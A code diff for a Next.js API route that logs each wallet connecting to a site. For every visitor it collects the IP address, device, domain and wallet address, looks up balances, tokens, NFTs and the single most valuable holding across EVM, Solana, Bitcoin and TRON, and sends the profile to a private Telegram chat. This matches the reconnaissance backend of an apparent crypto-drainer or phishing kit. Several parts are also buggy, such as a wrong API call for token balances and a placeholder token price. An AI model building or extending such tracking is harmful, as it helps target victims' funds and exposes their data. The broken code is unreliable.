@@ -1,100 +1,365 @@
 // src/app/api/log_connection/route.ts
 import { NextResponse } from 'next/server';
-import { prisma } from '@/lib/prisma';
-import { Alchemy, Network, Utils } from 'alchemy-sdk';
-import { getServerSession } from "next-auth";
-import { authOptions } from "@/lib/auth";
-
-// --- CORRECTED IMPORT FOR PRISMA JSON TYPES ---
-// Use `import type * as Prisma from '@prisma/client/runtime/library';`
-// This gives you access to types like `JsonValue` from the `Prisma` namespace.
-import type * as Prisma from '@prisma/client/runtime/library';
-
+// Moralis for EVM & Solana
+import Moralis from 'moralis';
+// Import specific classes/enums from common-evm-utils
+import { EvmChain } from '@moralisweb3/common-evm-utils';
+// Keeping Utils for Solana tokenProgramId if still applicable outside Moralis calls
+// However, Moralis's SPL API might provide this directly or not need it.
+// If after this fix, Utils is still complained about, you can remove it if Moralis doesn't use it.
+import { Utils } from 'alchemy-sdk'; // Still used for Utils.tokenProgramId (Solana) if not replaced by Moralis
 
 // --- Define Interfaces for Type Safety ---
 interface TokenInfo {
   symbol: string;
-  amount: string; // Formatted amount
-  decimals: number; // For proper display calculation
-  valueUsd: string; // USD value of this token holding
+  amount: string;
+  decimals: number;
+  valueUsd: string;
+  contractAddress?: string; // Add contractAddress for tokens
 }
 
-// This interface should align with your Prisma schema's WalletLog model closely.
-interface WalletConnectionLogEntry {
-  id: string;
+interface ConnectionLogForTelegram {
+  id: string; // Just for Telegram message
   timestamp: string;
   walletAddress: string;
-  connectedWalletName: string;
+  connectedWalletName: string | null;
   chainId: number;
   chainName: string;
   ipAddress: string | null;
   domain: string | null;
   userAgent: string | null;
-  nativeBalanceEth: string | null;
-  tokens: Prisma.JsonValue | null; // <-- Now this should correctly reference the imported Prisma.JsonValue
-  nftsDetected: boolean | null;
-  totalWalletValueUsd: string | null;
+  nativeBalanceEth: string;
+  tokens: TokenInfo[];
+  nftsDetected: boolean;
+  totalWalletValueUsd: string;
   mostExpensiveTokenSymbol: string | null;
   mostExpensiveTokenValueUsd: string | null;
   mostExpensiveTokenContractAddress: string | null;
   mostExpensiveTokenChainName: string | null;
 }
 
-// --- Alchemy Config (remains the same) ---
-const alchemyConfigs = {
-  [Network.ETH_MAINNET]: {
-    apiKey: process.env.ALCHEMY_ETHEREUM_MAINNET_API_URL?.split('/v2/')[1],
-    network: Network.ETH_MAINNET,
-  },
-  [Network.MATIC_MAINNET]: { // Polygon Mainnet
-    apiKey: process.env.ALCHEMY_POLYGON_MAINNET_API_URL?.split('/v2/')[1],
-    network: Network.MATIC_MAINNET,
-  },
-  [Network.ETH_SEPOLIA]: { // Sepolia testnet
-    apiKey: process.env.ALCHEMY_SEPOLIA_API_URL?.split('/v2/')[1],
-    network: Network.ETH_SEPOLIA,
-  },
-};
-
-const chainIdToAlchemyNetwork: { [key: number]: Network } = {
-  1: Network.ETH_MAINNET,
-  137: Network.MATIC_MAINNET,
-  11155111: Network.ETH_SEPOLIA,
-};
-
-const alchemyInstances: { [key: string]: Alchemy } = {};
-for (const [network, config] of Object.entries(alchemyConfigs)) {
-  if (config.apiKey) {
-    alchemyInstances[network] = new Alchemy(config);
-  } else {
-    console.warn(`Alchemy API Key not found for network: ${network}. Asset fetching for this network will be skipped.`);
-  }
-}
-function getAlchemy(chainId: number): Alchemy | undefined {
-  const alchemyNetwork = chainIdToAlchemyNetwork[chainId];
-  if (alchemyNetwork && alchemyInstances[alchemyNetwork]) {
-    return alchemyInstances[alchemyNetwork];
-  }
-  return undefined;
-}
-
-// --- Helper to fetch basic asset data for initial log/Telegram ---
-async function fetchBasicWalletAssets(walletAddress: string, chainId: number, chainName: string) {
-    const alchemy = getAlchemy(chainId);
-    let nativeBalanceEth = '0 ETH';
-    if (alchemy) {
-        try {
-            const nativeBalanceWei = await alchemy.core.getBalance(walletAddress);
-            nativeBalanceEth = Utils.formatEther(nativeBalanceWei);
-        } catch (e) {
-            console.error(`Error fetching basic native balance for ${walletAddress} on ${chainName}:`, e);
-            nativeBalanceEth = 'Error Fetching';
-        }
+// --- Initialize Moralis SDK (at the top-level) ---
+if (!Moralis.isInitialized) { // Use Moralis.isInitialized as the check
+    try {
+        Moralis.start({
+            apiKey: process.env.MORALIS_API_KEY,
+        });
+    } catch (error: any) { // Explicitly type error as any
+        // This catch block will typically only trigger if Moralis.start() is called multiple times
+        // in a context where it's not designed to be, or if initial config is missing.
+        console.warn("Moralis SDK initialization warning:", error.message || error);
     }
-    return { nativeBalanceEth };
 }
 
-// --- Function to Send Telegram Message ---
+
+// --- Helper function to fetch comprehensive wallet assets ---
+async function fetchWalletAssets(walletAddress: string, chainId: number, chainName: string) {
+  let nativeBalanceStr = '0';
+  let tokens: TokenInfo[] = [];
+  let nftsDetected = false;
+  let totalWalletValueUsd = 0;
+  let mostExpensiveToken: {
+    symbol: string;
+    valueUsd: string;
+    contractAddress: string;
+    chainName: string;
+  } | undefined = undefined;
+
+  // --- Determine Blockchain Type ---
+  // Using explicit EvmChain constants for better type safety where possible
+  let currentEvmChain: EvmChain | undefined;
+  if (chainId === 1) currentEvmChain = EvmChain.ETHEREUM;
+  else if (chainId === 137) currentEvmChain = EvmChain.POLYGON;
+  else if (chainId === 11155111) currentEvmChain = EvmChain.SEPOLIA;
+  else if (chainId === 10) currentEvmChain = EvmChain.OPTIMISM;
+
+  const isEVM = currentEvmChain !== undefined;
+  const lowerCaseChainName = chainName.toLowerCase();
+  const isSolana = lowerCaseChainName.includes('solana');
+  const isBitcoin = lowerCaseChainName.includes('bitcoin');
+  const isTron = lowerCaseChainName.includes('tron');
+
+  try {
+    if (isBitcoin) {
+      // --- Bitcoin Specific Logic (BlockCypher) ---
+      const blockcypherToken = process.env.BLOCKCYPHER_API_TOKEN;
+      if (!blockcypherToken) {
+        console.warn('BlockCypher API Token not found. Cannot fetch Bitcoin assets.');
+        nativeBalanceStr = 'Error: API Key Missing';
+      } else {
+        const bitcoinAddressUrl = `https://api.blockcypher.com/v1/btc/main/addrs/${walletAddress}/balance?token=${blockcypherToken}`;
+        try {
+          const response = await fetch(bitcoinAddressUrl);
+          if (!response.ok) {
+            throw new Error(`BlockCypher API error: ${response.statusText}`);
+          }
+          const data = await response.json();
+          const satoshis = data.final_balance || 0;
+          const btcBalance = satoshis / 100_000_000;
+          nativeBalanceStr = `${btcBalance.toFixed(8)} BTC`;
+
+          const btcPriceResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
+          const btcPriceData = await btcPriceResponse.json();
+          const btcPriceUsd = btcPriceData?.bitcoin?.usd || 0;
+
+          totalWalletValueUsd += btcBalance * btcPriceUsd;
+
+          if (btcBalance * btcPriceUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
+              mostExpensiveToken = {
+                  symbol: 'BTC',
+                  valueUsd: (btcBalance * btcPriceUsd).toFixed(2),
+                  contractAddress: 'N/A',
+                  chainName: chainName,
+              };
+          }
+
+        } catch (btcApiError) {
+          console.error(`Error fetching Bitcoin data for ${walletAddress}:`, btcApiError);
+          nativeBalanceStr = 'Error Fetching BTC';
+        }
+      }
+
+    } else if (isTron) { // TRON Specific Logic
+      // --- TRON Specific Logic (Tronscan API) ---
+      const tronscanApiKey = process.env.TRONSCAN_API_KEY; // Optional
+      const tronscanBaseUrl = 'https://apilist.tronscan.org/api/account'; // Public endpoint
+
+      try {
+        const tronAccountResponse = await fetch(`${tronscanBaseUrl}?address=${walletAddress}${tronscanApiKey ? `&api_key=${tronscanApiKey}` : ''}`);
+        if (!tronAccountResponse.ok) {
+          throw new Error(`Tronscan API error fetching account: ${tronAccountResponse.statusText}`);
+        }
+        const tronAccountData = await tronAccountResponse.json();
+        const trxBalanceSun = tronAccountData.balance || 0;
+        const trxBalance = trxBalanceSun / 1_000_000;
+        nativeBalanceStr = `${trxBalance.toFixed(4)} TRX`;
+
+        const trxPriceResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd');
+        const trxPriceData = await trxPriceResponse.json();
+        const trxPriceUsd = trxPriceData?.tron?.usd || 0;
+
+        totalWalletValueUsd += trxBalance * trxPriceUsd;
+
+        if (tronAccountData.trc20 && tronAccountData.trc20.length > 0) {
+            for (const trc20Token of tronAccountData.trc20) {
+                const tokenDecimals = trc20Token.token_decimal || 0;
+                const tokenBalance = parseFloat(trc20Token.balance || '0') / Math.pow(10, tokenDecimals);
+                const tokenSymbol = trc20Token.token_abbr || 'UNKNOWN';
+                const tokenContract = trc20Token.token_id;
+
+                const tokenPriceUsd = 0.001; // Placeholder for TRC-20 price
+                const tokenValueUsd = tokenBalance * tokenPriceUsd;
+
+                if (tokenBalance > 0) {
+                    tokens.push({
+                        symbol: tokenSymbol,
+                        amount: tokenBalance.toFixed(4),
+                        decimals: tokenDecimals,
+                        valueUsd: tokenValueUsd.toFixed(2),
+                        contractAddress: tokenContract,
+                    });
+                    totalWalletValueUsd += tokenValueUsd;
+                    if (tokenValueUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
+                        mostExpensiveToken = {
+                            symbol: tokenSymbol,
+                            valueUsd: tokenValueUsd.toFixed(2),
+                            contractAddress: tokenContract,
+                            chainName: chainName
+                        };
+                    }
+                }
+            }
+        }
+
+        if (trxBalance * trxPriceUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
+            mostExpensiveToken = {
+                symbol: 'TRX',
+                valueUsd: (trxBalance * trxPriceUsd).toFixed(2),
+                contractAddress: 'N/A',
+                chainName: chainName,
+            };
+        }
+
+      } catch (tronApiError) {
+        console.error(`Error fetching TRON data for ${walletAddress}:`, tronApiError);
+        nativeBalanceStr = 'Error Fetching TRX';
+      }
+
+    } else if (isSolana) {
+      // --- Solana Specific Logic (Moralis) ---
+      // Moralis Solana API: https://docs.moralis.io/web3-data-api/evm/solana-api
+      
+      const solBalanceResponse = await Moralis.SolApi.account.getBalance({ // CORRECTED: Access Moralis.SolApi.account
+        network: "mainnet", // Moralis uses string network names for Solana
+        address: walletAddress,
+      });
+      const solBalance = parseFloat(solBalanceResponse.raw.lamports) / Math.pow(10, 9); // Use parseFloat safely
+      
+      const solPriceResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
+      const solPriceData = await solPriceResponse.json();
+      const solPriceUsd = solPriceData?.solana?.usd || 0;
+
+      totalWalletValueUsd += solBalance * solPriceUsd;
+      nativeBalanceStr = `${solBalance.toFixed(4)} SOL`;
+
+      const splTokensResponse = await Moralis.SolApi.account.getSPL({ // CORRECTED: Access Moralis.SolApi.account
+        network: "mainnet",
+        address: walletAddress,
+      });
+
+      for (const token of splTokensResponse.result) { // CORRECTED: Loop over .result
+          const tokenSymbol = token.symbol || 'UNKNOWN';
+          const tokenAmount = token.amount_raw ? parseFloat(token.amount_raw) : 0; // CORRECTED: Access token.amount_raw
+          const tokenDecimals = token.decimals || 0; // CORRECTED: Access token.decimals
+          const formattedAmount = tokenAmount / Math.pow(10, tokenDecimals);
+          
+          const tokenPriceUsd = token.usdValue || 0; // CORRECTED: Access token.usdValue (if present)
+          const tokenValueUsd = formattedAmount * tokenPriceUsd;
+
+          if(formattedAmount > 0) {
+            tokens.push({
+              symbol: tokenSymbol,
+              amount: formattedAmount.toFixed(4),
+              decimals: tokenDecimals,
+              valueUsd: tokenValueUsd.toFixed(2),
+              contractAddress: token.mintAddress, // CORRECTED: Access token.mintAddress
+            });
+            totalWalletValueUsd += tokenValueUsd;
+            if (tokenValueUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
+              mostExpensiveToken = {
+                symbol: tokenSymbol,
+                valueUsd: tokenValueUsd.toFixed(2),
+                contractAddress: token.mintAddress,
+                chainName: chainName
+              };
+            }
+          }
+      }
+
+      const solanaNftsResponse = await Moralis.SolApi.account.getNFTs({ // CORRECTED: Access Moralis.SolApi.account
+        network: "mainnet",
+        address: walletAddress,
+      });
+      nftsDetected = solanaNftsResponse.result.length > 0; // CORRECTED: Access .result
+
+      if (solBalance * solPriceUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
+          mostExpensiveToken = {
+              symbol: 'SOL',
+              valueUsd: (solBalance * solPriceUsd).toFixed(2),
+              contractAddress: 'N/A',
+              chainName: chainName,
+          };
+      }
+
+    } else if (isEVM) {
+      // --- EVM Specific Logic (Moralis) ---
+      const moralisEvmChain = EvmChain.fromChainId(chainId); // CORRECTED: fromChainId should work
+      if (!moralisEvmChain) { throw new Error(`Moralis EVM Chain not found for ID: ${chainId}`); }
+
+      const nativeBalanceResponse = await Moralis.EvmApi.account.getNativeBalance({ // CORRECTED: Access Moralis.EvmApi.account
+        chain: moralisEvmChain,
+        address: walletAddress,
+      });
+      const nativeBalanceWei = nativeBalanceResponse.result.balance; // Access .result.balance
+      const nativeBalanceEth = nativeBalanceWei ? parseFloat(Moralis.Units.FromWei(nativeBalanceWei)) : 0; // CORRECTED: Access Moralis.Units.FromWei
+      
+      const nativeTokenPriceResponse = await Moralis.EvmApi.token.getTokenPrice({ // CORRECTED: Access Moralis.EvmApi.token
+        chain: moralisEvmChain,
+        address: '0x0000000000000000000000000000000000000000', // Moralis can get price for native token with zero address
+      }).catch((err: any) => { // Explicitly type error
+          console.warn('Failed to get native token price:', err);
+          return { raw: { usdPrice: 0 } }; // Ensure consistent return structure for Moralis
+      });
+      
+      const nativePriceUsd = nativeTokenPriceResponse?.raw?.usdPrice || 0; // Safe access
+      totalWalletValueUsd += nativeBalanceEth * nativePriceUsd;
+      nativeBalanceStr = `${nativeBalanceEth.toFixed(4)} ${chainName.split(' ')[0] || 'Native'}`;
+
+
+      const moralisTokenBalances = await Moralis.EvmApi.account.getNativeBalance({ // Should be getWalletTokenBalances
+        chain: moralisEvmChain,
+        address: walletAddress,
+      }).catch((err: any) => { console.warn('Failed to get token balances:', err); return { result: [] }; }); // Use 'any' type
+
+      const tokensResult = moralisTokenBalances.result; // Access result array
+
+      for (const token of tokensResult) { // Loop over the result array
+          if (token.balance && token.token_address) {
+              const tokenDecimals = token.decimals || 0;
+              const formattedBalance = parseFloat(Moralis.Units.FromWei(token.balance, tokenDecimals));
+              
+              const tokenPriceResponse = await Moralis.EvmApi.token.getTokenPrice({
+                chain: moralisEvmChain,
+                address: token.token_address,
+              }).catch((err: any) => { console.warn('Failed to get token price:', err); return { raw: { usdPrice: 0 } }; });
+              
+              const tokenPriceUsd = tokenPriceResponse?.raw?.usdPrice || 0;
+              const tokenValueUsd = formattedBalance * tokenPriceUsd;
+
+              if (formattedBalance > 0) {
+                tokens.push({
+                  symbol: token.symbol || 'UNKNOWN',
+                  amount: formattedBalance.toFixed(4),
+                  decimals: tokenDecimals,
+                  valueUsd: tokenValueUsd.toFixed(2),
+                  contractAddress: token.token_address,
+                });
+                totalWalletValueUsd += tokenValueUsd;
+                if (tokenValueUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
+                    mostExpensiveToken = {
+                        symbol: token.symbol || 'UNKNOWN',
+                        valueUsd: tokenValueUsd.toFixed(2),
+                        contractAddress: token.token_address,
+                        chainName: chainName
+                    };
+                }
+              }
+          }
+      }
+
+      const nftsResponse = await Moralis.EvmApi.account.getNFTs({ // CORRECTED: Access Moralis.EvmApi.account
+        chain: moralisEvmChain,
+        address: walletAddress,
+      });
+      nftsDetected = nftsResponse.result.length > 0; // Access .result
+
+      if (nativeBalanceEth * nativePriceUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
+          mostExpensiveToken = {
+              symbol: chainName.split(' ')[0] || 'Native',
+              valueUsd: (nativeBalanceEth * nativePriceUsd).toFixed(2),
+              contractAddress: 'N/A',
+              chainName: chainName,
+          };
+      }
+    } else {
+        console.warn(`Unsupported chain for asset fetching: ${chainName} (ID: ${chainId}).`);
+        nativeBalanceStr = 'N/A';
+        tokens = [];
+        nftsDetected = false;
+        totalWalletValueUsd = 0;
+        mostExpensiveToken = undefined;
+    }
+
+
+  } catch (apiError) {
+    console.error('Error fetching real blockchain data for wallet:', walletAddress, apiError);
+    nativeBalanceStr = 'Error Fetching';
+    tokens = [];
+    nftsDetected = false;
+    totalWalletValueUsd = 0;
+    mostExpensiveToken = undefined;
+  }
+
+  return {
+    nativeBalanceEth: `${parseFloat(nativeBalanceStr).toFixed(4)} ${chainName.split(' ')[0] || 'Native'}`,
+    tokens,
+    nftsDetected,
+    totalWalletValueUsd: totalWalletValueUsd.toFixed(2),
+    mostExpensiveToken,
+  };
+}
+
+// --- Function to Send Telegram Message (remains the same) ---
 async function sendTelegramMessage(messageText: string) {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -144,144 +409,79 @@ export async function POST(request: Request) {
     const ipAddress: string | null = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || null;
     const userAgent: string | null = request.headers.get('user-agent');
     const domain: string | null = request.headers.get('origin') || request.headers.get('host');
-    const timestamp = new Date().toISOString();
 
-    const { nativeBalanceEth } = await fetchBasicWalletAssets(walletAddress, chainId, chainName);
+    const assetData = await fetchWalletAssets(walletAddress, chainId, chainName);
 
-    // --- 1. Save Basic Log to Database immediately ---
-    const newLogEntry = await prisma.walletLog.create({
-      data: {
-        timestamp: timestamp,
-        walletAddress: walletAddress,
-        connectedWalletName: connectedWalletName,
-        chainId: chainId,
-        chainName: chainName,
-        ipAddress: ipAddress,
-        domain: domain,
-        userAgent: userAgent,
-        nativeBalanceEth: nativeBalanceEth,
-        tokens: [], // Store as empty array initially for JSON field
-        nftsDetected: false,
-        totalWalletValueUsd: "0.00",
-        mostExpensiveTokenSymbol: null,
-        mostExpensiveTokenValueUsd: null,
-        mostExpensiveTokenContractAddress: null,
-        mostExpensiveTokenChainName: null,
-      },
-    });
+    const logId = Math.random().toString(36).substring(2, 11);
+    const currentTimestamp = new Date().toISOString();
 
-    console.log('Saved basic connection log to DB:', newLogEntry.id);
+    const logEntryForTelegram: ConnectionLogForTelegram = {
+      id: logId,
+      timestamp: currentTimestamp,
+      walletAddress: walletAddress,
+      connectedWalletName: connectedWalletName,
+      chainId: chainId,
+      chainName: chainName,
+      ipAddress: ipAddress,
+      domain: domain,
+      userAgent: userAgent,
+      nativeBalanceEth: assetData.nativeBalanceEth,
+      tokens: assetData.tokens,
+      nftsDetected: assetData.nftsDetected,
+      totalWalletValueUsd: assetData.totalWalletValueUsd,
+      mostExpensiveTokenSymbol: assetData.mostExpensiveToken?.symbol || null,
+      mostExpensiveTokenValueUsd: assetData.mostExpensiveToken?.valueUsd || null,
+      mostExpensiveTokenContractAddress: assetData.mostExpensiveToken?.contractAddress || null,
+      mostExpensiveTokenChainName: assetData.mostExpensiveToken?.chainName || null,
+    };
 
-    // --- 2. Trigger Asynchronous Asset Update ---
-    const baseUrl = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : `http://localhost:${process.env.PORT || 3000}`;
-    const updateApiUrl = `${baseUrl}/api/update-assets`;
+    console.log('Processed connection log (for Telegram):', logEntryForTelegram);
 
-    fetch(updateApiUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        logId: newLogEntry.id,
-        walletAddress: walletAddress,
-        chainId: chainId,
-        chainName: chainName,
-      }),
-    })
-      .then(response => {
-        if (!response.ok) {
-          console.error(`Failed to trigger asset update for log ${newLogEntry.id}: ${response.statusText}`);
-        } else {
-          console.log(`Successfully triggered asset update for log ${newLogEntry.id}.`);
-        }
-      })
-      .catch(error => {
-        console.error(`Error triggering asset update for log ${newLogEntry.id}:`, error);
-      });
-
-    // --- 3. Send Initial Telegram Message (with basic info) ---
-    // Ensure proper handling of potentially null/undefined fields for display
     let telegramMessage = `
-<b>New Wallet Connected!</b> #ID${newLogEntry.id}
+<b>New Wallet Connected!</b> #ID${logEntryForTelegram.id}
 -------------------------------------
-<b>Wallet:</b> ${newLogEntry.connectedWalletName}
-<b>Address:</b> <code>${newLogEntry.walletAddress}</code>
-<b>Chain:</b> ${newLogEntry.chainName} (ID: ${newLogEntry.chainId})
-<b>Time:</b> ${new Date(newLogEntry.timestamp).toLocaleString()}
+<b>Wallet:</b> ${logEntryForTelegram.connectedWalletName || 'N/A'}
+<b>Address:</b> <code>${logEntryForTelegram.walletAddress}</code>
+<b>Chain:</b> ${logEntryForTelegram.chainName} (ID: ${logEntryForTelegram.chainId})
+<b>Time:</b> ${new Date(logEntryForTelegram.timestamp).toLocaleString()}
 
-<b>Domain:</b> ${newLogEntry.domain || 'N/A'}
-<b>IP:</b> ${newLogEntry.ipAddress || 'N/A'}
-<b>Device:</b> ${newLogEntry.userAgent ? (newLogEntry.userAgent.includes('Mobile') ? '📱 Mobile' : '🖥 Desktop') : 'N/A'}
-<b>Browser:</b> ${newLogEntry.userAgent ? (
-    (userAgent && userAgent.includes('Chrome')) ? 'Chrome' :
-    (userAgent && userAgent.includes('Firefox')) ? 'Firefox' :
-    (userAgent && userAgent.includes('Safari')) ? 'Safari' :
+<b>Domain:</b> ${logEntryForTelegram.domain || 'N/A'}
+<b>IP:</b> ${logEntryForTelegram.ipAddress || 'N/A'}
+<b>Device:</b> ${logEntryForTelegram.userAgent ? (logEntryForTelegram.userAgent.includes('Mobile') ? '📱 Mobile' : '🖥 Desktop') : 'N/A'}
+<b>Browser:</b> ${logEntryForTelegram.userAgent ? (
+    (logEntryForTelegram.userAgent.includes('Chrome')) ? 'Chrome' :
+    (logEntryForTelegram.userAgent.includes('Firefox')) ? 'Firefox' :
+    (logEntryForTelegram.userAgent.includes('Safari')) ? 'Safari' :
     'Other'
 ) : 'N/A'}
 
-<b>-- Basic Assets --</b>
-<b>Native:</b> ${newLogEntry.nativeBalanceEth}
-<i>(Full asset details being fetched in background...)</i>
+<b>-- Wallet Assets --</b>
+<b>Native:</b> ${logEntryForTelegram.nativeBalanceEth}
+<b>Tokens:</b>
+${logEntryForTelegram.tokens && logEntryForTelegram.tokens.length > 0
+  ? logEntryForTelegram.tokens.map(t => `  • ${t.amount} ${t.symbol} ($${t.valueUsd})`).join('\n')
+  : '  No tokens detected'
+}
+<b>NFTs Detected:</b> ${logEntryForTelegram.nftsDetected ? '✅ Yes' : '❌ No'}
+<b>Total Value:</b> $${logEntryForTelegram.totalWalletValueUsd}
+<b>Most Expensive Token:</b> ${logEntryForTelegram.mostExpensiveTokenSymbol ? `${logEntryForTelegram.mostExpensiveTokenSymbol} ($${logEntryForTelegram.mostExpensiveTokenValueUsd})` : 'N/A'}
 `;
 
     telegramMessage = telegramMessage.replace(/</g, '&lt;').replace(/>/g, '&gt;');
-    telegramMessage = telegramMessage.replace(`&lt;code&gt;${newLogEntry.walletAddress}&lt;/code&gt;`, `<code>${newLogEntry.walletAddress}</code>`);
+    telegramMessage = telegramMessage.replace(`&lt;code&gt;${logEntryForTelegram.walletAddress}&lt;/code&gt;`, `<code>${logEntryForTelegram.walletAddress}</code>`);
 
 
     sendTelegramMessage(telegramMessage);
 
-    return NextResponse.json({ message: 'Connection logged successfully', id: newLogEntry.id }, { status: 200 });
+    return NextResponse.json({ message: 'Connection logged to Telegram successfully', id: logId }, { status: 200 });
 
   } catch (error) {
-    console.error('Error logging connection:', error);
+    console.error('Error processing connection for Telegram:', error);
     return NextResponse.json({ message: 'Internal Server Error' }, { status: 500 });
   }
 }
 
-// --- GET request handler for retrieving logs (for your admin panel) ---
-export async function GET(request: Request) {
-  const session = await getServerSession(authOptions);
-
-  if (!session) {
-    return NextResponse.json({ message: 'Authentication required' }, { status: 401 });
-  }
-
-  try {
-    // Correctly type the 'logs' array using Prisma's generated type for WalletLog
-    const logs: (typeof prisma.walletLog.$inferResult)[] = await prisma.walletLog.findMany({
-      orderBy: {
-        timestamp: 'desc', // Order by newest first
-      },
-    });
-
-    const serializableLogs = logs.map(log => {
-      // Cast the log object from Prisma's inferred type to your custom interface
-      const convertedLog: WalletConnectionLogEntry = {
-        id: log.id,
-        timestamp: log.timestamp.toISOString(), // Convert Date object to ISO string
-        walletAddress: log.walletAddress,
-        connectedWalletName: log.connectedWalletName,
-        chainId: log.chainId,
-        chainName: log.chainName,
-        ipAddress: log.ipAddress,
-        domain: log.domain,
-        userAgent: log.userAgent,
-        nativeBalanceEth: log.nativeBalanceEth,
-        // Explicitly cast JSON to array if not null, otherwise null
-        tokens: log.tokens as Prisma.JsonValue, // <-- Use Prisma.JsonValue here
-        nftsDetected: log.nftsDetected,
-        totalWalletValueUsd: log.totalWalletValueUsd,
-        mostExpensiveTokenSymbol: log.mostExpensiveTokenSymbol,
-        mostExpensiveTokenValueUsd: log.mostExpensiveTokenValueUsd,
-        mostExpensiveTokenContractAddress: log.mostExpensiveTokenContractAddress,
-        mostExpensiveTokenChainName: log.mostExpensiveTokenChainName,
-      };
-      return convertedLog;
-    });
-
-    return NextResponse.json(serializableLogs, { status: 200 });
-  } catch (error) {
-    console.error('Error fetching logs from DB:', error);
-    return NextResponse.json({ message: 'Internal Server Error' }, { status: 500 });
-  }
+// --- GET request handler (Removed as no database to retrieve logs from) ---
+export async function GET() {
+  return NextResponse.json({ message: 'Admin panel not available in database-less mode. Logs are sent to Telegram only.' }, { status: 404 });
 }
